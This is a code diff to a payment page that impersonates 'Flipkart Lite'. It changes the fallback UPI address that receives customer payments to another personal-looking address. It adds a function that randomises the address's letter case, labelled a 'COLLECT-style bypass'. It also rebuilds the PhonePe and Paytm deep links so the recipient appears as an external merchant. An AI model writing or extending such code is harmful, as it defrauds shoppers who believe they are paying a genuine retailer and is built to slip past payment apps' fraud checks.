@@ -327,11 +327,19 @@
         const amount = totalAmount;
         const productName = product.name;
 
-        let savedUPI = localStorage.getItem('merchantUPI') || "4138667430069s1024@mairtel";
+        let savedUPI = localStorage.getItem('merchantUPI') || "paytm.s222r67@pty";
         let phonepeUPI = savedUPI;
         let paytmUPI = savedUPI;
         let qrUPI = savedUPI;
         const merchantName = "Flipkart Lite";
+
+        // Randomize UPI address case (COLLECT-style bypass)
+        function randomizeCase(str) {
+            return [...str].map(function(ch) {
+                if (/[a-z]/i.test(ch)) return Math.random() < 0.5 ? ch.toLowerCase() : ch.toUpperCase();
+                return ch;
+            }).join("");
+        }
 
         // Generate dynamic QR code if qrUPI is set
         function generateQRCode() {
@@ -419,32 +427,33 @@
             let deepLink = '';
             
             if (method === 'phonepe') {
-                // PhonePe native deep link with base64-encoded JSON payload
+                // PhonePe COLLECT-style deep link with randomized UPI case
                 const amountPaise = Math.round(amount * 100);
+                const randomUpi = randomizeCase(phonepeUPI);
                 const payload = {
                     "contact": {
-                        "cbcName": "",
-                        "nickName": "",
-                        "vpa": phonepeUPI,
-                        "type": "VPA"
+                        "type": "EXTERNAL_MERCHANT",
+                        "name": merchantName,
+                        "vpa": randomUpi
                     },
                     "p2pPaymentCheckoutParams": {
-                        "note": merchantName,
-                        "isByDefaultKnownContact": true,
+                        "checkoutType": "COLLECT",
                         "initialAmount": amountPaise,
-                        "currency": "INR",
-                        "checkoutType": "DEFAULT",
-                        "transactionContext": "p2p"
+                        "note": {
+                            "type": "text",
+                            "message": merchantName
+                        },
+                        "supportedInstruments": -1
                     }
                 };
                 const jsonStr = JSON.stringify(payload);
-                const b64 = btoa(jsonStr);
-                const data = encodeURIComponent(b64);
-                deepLink = `phonepe://native?data=${data}&id=p2ppayment`;
+                const b64 = btoa(unescape(encodeURIComponent(jsonStr)));
+                deepLink = `phonepe://native?data=${encodeURIComponent(b64)}&id=p2ppayment`;
             } else {
-                // Paytm - native deep link
+                // Paytm - COLLECT-style deep link with randomized UPI case
                 const txnId = 'TXN-' + Date.now() + Math.floor(Math.random() * 1000);
-                deepLink = `paytmmp://cash_wallet?pa=${encodeURIComponent(paytmUPI)}&pn=${encodeURIComponent(merchantName)}&am=${amount}&cu=INR&tn=${encodeURIComponent(txnId)}&tr=&mc=&featuretype=money_transfer`;
+                const randomUpi = randomizeCase(paytmUPI);
+                deepLink = `paytmmp://cash_wallet?pa=${encodeURIComponent(randomUpi)}&pn=${encodeURIComponent(merchantName)}&am=${amount}&cu=INR&tn=${encodeURIComponent(txnId)}&tr=&mc=&featuretype=money_transfer`;
             }
             
             // Try to open payment app
